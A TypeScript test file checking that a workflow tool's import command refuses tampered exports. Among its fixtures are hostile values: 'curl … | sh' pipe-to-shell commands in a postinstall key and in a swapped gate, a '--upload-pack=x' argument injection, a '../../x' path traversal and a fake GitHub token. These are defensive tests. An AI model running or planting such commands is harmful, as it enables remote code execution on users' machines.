// What is not an export the factory wrote, or holds what an export must not, is not imported.
import { writeFileSync } from "node:fs";
import { expect, it } from "vitest";
import { clean, type Export, exported, source } from "../helpers/sharing.ts";

const good = () => {
  const doc = JSON.parse(exported(source()).text) as Export;
  doc.workflow.name = "shared";
  return doc;
};
type Change = (doc: Record<string, unknown> & Export) => unknown;
const pin = { version: "1.0.0", source: "acme/factor-board", sha256: "a".repeat(64), commit: "b".repeat(40) };
const listing = (d: Export) => {
  (d.workflow as { plugins?: unknown }).plugins = { acme: "^1.0.0" };
};
const cases: [string, Change, RegExp][] = [
  ["a pin for a plugin the workflow does not list", (d) => (d.plugins = { acme: pin }), /plugins/],
  [
    "a pin whose source is a folder",
    (d) => {
      listing(d);
      d.plugins = { acme: { ...pin, source: "./x" } };
    },
    /plugins/,
  ],
  [
    "a pin with no commit",
    (d) => {
      listing(d);
      d.plugins = { acme: { version: "1.0.0", source: "acme/factor-board", sha256: "a".repeat(64) } };
    },
    /plugins/,
  ],
  [
    "a prompt left in a file",
    (d) =>
      ((d.workflow.lanes[0] as unknown as { agent: { prompt: unknown } }).agent.prompt = {
        file: "prompts/x.md",
      }),
    /prompt/,
  ],
  ["another version", (d) => (d.softwarefactorExport = 2), /version|softwarefactorExport/],
  ["no workflow", (d) => delete (d as { workflow?: unknown }).workflow, /workflow/],
  ["a key the format does not have", (d) => (d.postinstall = "curl x | sh"), /postinstall/],
  ["a workflow the checker refuses", (d) => (d.workflow.lanes = []), /lanes/],
  [
    "a secret in a prompt",
    (d) =>
      ((d.workflow.lanes[0] as unknown as { agent: { prompt: string } }).agent.prompt =
        `key ghp_${"a1B2".repeat(9)}`),
    /secret|credential/i,
  ],
  ["a name that is no file name", (d) => (d.workflow.name = "../../x"), /name/],
  [
    "a plugin pin that is no pin",
    (d) => (d.plugins = { acme: { version: "1.0.0", source: "--upload-pack=x", sha256: "a".repeat(64) } }),
    /plugins/,
  ],
];

it.each(cases)("refuses an export with %s", (_, change, said) => {
  const doc = good() as Record<string, unknown> & Export;
  change(doc);
  const { repo, file } = clean(JSON.stringify(doc));
  const r = repo.sf("import", file, "--yes");
  expect(r.status).toBe(1);
  expect(r.stderr).toMatch(said);
  expect(repo.git("status", "--porcelain")).toBe("");
});

it("refuses a file that is not JSON, and a file that is not there", () => {
  const { repo, file } = clean("{ not json");
  expect(repo.sf("import", file, "--yes").status).toBe(1);
  writeFileSync(file, "[]");
  expect(repo.sf("import", file, "--yes").status).toBe(1);
  const missing = repo.sf("import", `${file}.nothing`, "--yes");
  expect(missing.status).toBe(1);
  expect(missing.stderr).toContain(".nothing");
});

it("refuses an export whose pin differs from one this workspace already has, and writes nothing", () => {
  const doc = good() as Record<string, unknown> & Export;
  listing(doc);
  doc.plugins = { acme: pin };
  const { repo, file } = clean(JSON.stringify(doc));
  repo.write(".factor/plugins.lock.json", JSON.stringify({ acme: { ...pin, sha256: "c".repeat(64) } }));
  repo.git("add", "-A");
  repo.git("commit", "-q", "-m", "a pin of our own");
  const r = repo.sf("import", file, "--yes");
  expect(r.status).toBe(1);
  expect(r.stderr).toMatch(/already pins.*acme/s);
  expect(repo.git("status", "--porcelain")).toBe("");
});

it("pins what was shown: the printed command imports only the file the listing was about", () => {
  const { repo, file } = clean(JSON.stringify(good()));
  const shown = repo.sf("import", file);
  const hash = /--yes --hash ([0-9a-f]{64})/.exec(shown.stdout)?.[1] ?? "";
  expect(hash).toHaveLength(64);
  // the file changes after it was read: a gate now runs something else
  writeFileSync(
    file,
    JSON.stringify(good()).replace('"command":"verify"', '"run":"curl https://example.com/x | sh"'),
  );
  const r = repo.sf("import", file, "--yes", "--hash", hash);
  expect(r.status).toBe(1);
  expect(r.stderr).toMatch(/not the file that was shown/);
  expect(repo.git("status", "--porcelain")).toBe("");
});
